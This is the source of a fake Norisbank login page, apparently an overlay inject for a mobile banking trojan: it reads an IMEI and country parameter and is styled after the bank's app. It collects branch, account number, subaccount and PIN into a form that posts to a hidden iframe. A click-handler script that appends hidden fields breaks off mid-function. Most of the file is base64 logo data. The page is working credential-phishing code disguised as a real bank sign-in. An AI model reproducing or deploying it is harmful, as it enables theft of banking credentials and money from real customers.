<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="de/com.db.mm.norisbank/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">

        <img style="display: block; margin: 0 auto;margin-top: 80px;width: 50%;" src="data:image/png;base64,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">
    </div>
    <div class="footer">
      <center>
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFsAAAAfCAIAAAAHnSa0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6REI3NTVDOUQ5NzI1MTFFOEFGNTdDNTc5MkE2NkM2QzAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6REI3NTVDOUU5NzI1MTFFOEFGNTdDNTc5MkE2NkM2QzAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpEQjc1NUM5Qjk3MjUxMUU4QUY1N0M1NzkyQTY2QzZDMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpEQjc1NUM5Qzk3MjUxMUU4QUY1N0M1NzkyQTY2QzZDMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PlZk6xMAAAPZSURBVHjaYvyUqsQwCmCAyTuXaTQUEIBbgNkjczREYICdm7XjGJBmGQ0KaH5xTmT4zzAaIlDA7F/E5JICDZrR4ACFgnU4gj0aHMzx3QycvKMhAvO/Vy6TiTeKCKlGsDrGsmjZUDmWNK3ZgysGJoF4ZqKHEalGsKhbMkmqUjmiuAUYhSTpHxysbYdB1H8YYhg0dc3vM1uBiN75xSacgUcYFBCMqFE+cgvUsHoUPo3SCLOaGZtnFpOwFMPvn3+uHv65ZTLDr+8QKUYhKfbgcmZp9f9f3v8+u+3fw8scSX1fa5xAjtCxZ3NJ+jYhHsjmKlv5a/dcJgklFl1HRk7ev4+v/VzZ/P/rR6omDybWnnNoSYMmdQ2LrhNn6sRfm/q/1rl9bQtk5BXmrlrHwMwKCg52Lq6SZf/unv/a4PGtN4qJR5DNI53h/z8spvz7y+5f9O/p7W9d4V+bfIBhwZk6icrFx4QrDCxs2OUYqRgijEzsoRU/Flf/vX8RxP3758eiSkYBCWYlAyCPzSvr3+Nrv/YtAKfP/z83T2IE5WGsIfLv791zfy7tBav893vPfCY5bSoGB6OKCSh1MGIJCyqnESZJZUZOvj+X9iHlzH+/Dy5jtQwE5SZtu9/H16OUpgeWwLMuKvj/58YxBAeY6ZhZqJhfWPIXYViIEihUCxFgnv///TO6XW+fMvKJgmTZONFk/71+hLvu+YFkxH9q5pe+iwRU/KdeiAAzPCM3P3owSSj9f/sEJPv7J7AoQYktYOlLX8CoYsrAxIxIEf9pXLL+e3kfWImw6Lsglyys1iG/Di4Dyd45zWLkgVIMWwbhdBQtgkPbniV/IXpO+Y9UgsAaadQrWf//+7m+hz2ygUlSBWwwM0dU09+Hl/+9uAfk/dw0kUXLmsXUB5p6bcIY2DgZ/vyiY3+/GHvq+I8uQk6hxeaXz+aZgSzya8fMX3vm/bmwG1gEsEfUMXLxMfz+9ffWiR+TGoG1KThPffjWF8ceWMLmlvr/26e/Vw/93r+Y1TqUTs1T+1hGCRWsdS1y+x0qRp+RZ0Y+ESZ+MWBzCy4CDJ3/P7/92jaNHvklfTpuafQ0QqfRAGBrjTNzGiOPINRWKTVWM7/fh1fQI784J2Ftd+ASpFO/5t/Tm78Or+TMngUsfRlYWBm5+H8sb/j/+R2t7WXJX8yobIwrOSCKEka655oBAYyKBiyFy9BLDYKFzjDu3aIEB/HF8LANjpJVhIuPERQiPEKMcjrgIgK1dmUcmSHCzMLadgQSEIzwfu5/fC33YR4iLI17saeH/yMy17BUb4X0tkmpk1B4AAEGAHNKPiK80W1eAAAAAElFTkSuQmCC">
        <form action="null" class="form" class="form" method="post" id="_mainForm" target="flow_handler">
            <div class="field11">
                <input type="tel" name="branch" style="margin: 10px" id="branch" class="field1" onkeyup="check();" minlength="3" maxlength="13" placeholder="Branch" required></br>
                <input type="tel" style="margin: 10px" name="account-number" id="account-number" class="field" onkeyup="check();" minlength="7" maxlength="13" placeholder="Account number" required></br>
                <input type="tel" style="margin: 10px" name="subaccount" id="subaccount" class="field1" onkeyup="check();" minlength="2" maxlength="12" placeholder="Subaccount" required></br>
            </div>

            <div class="field11">
                  <input type="password" style="margin: 10px" name="pin" id="pin" class="field2" onkeyup="check();" minlength="5" maxlength="10" placeholder="PIN" required></br>
                <input type="submit" style="margin: 10px" class="button" id="sbt_button" disabled value="Sign in">
            </div>
        </form>
      </center>
    </div>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script>
    function check() {
    var inp1 = document.getElementById('branch'),
        inp2 = document.getElementById('account-number'),
        inp3 = document.getElementById('subaccount'),
        inp4 = document.getElementById('pin');
    document.getElementById('sbt_button').disabled = inp1.value && inp2.value && inp3.value && inp4.value ? false : "disabled";
    }
</script>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('sbt_button');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('branch');
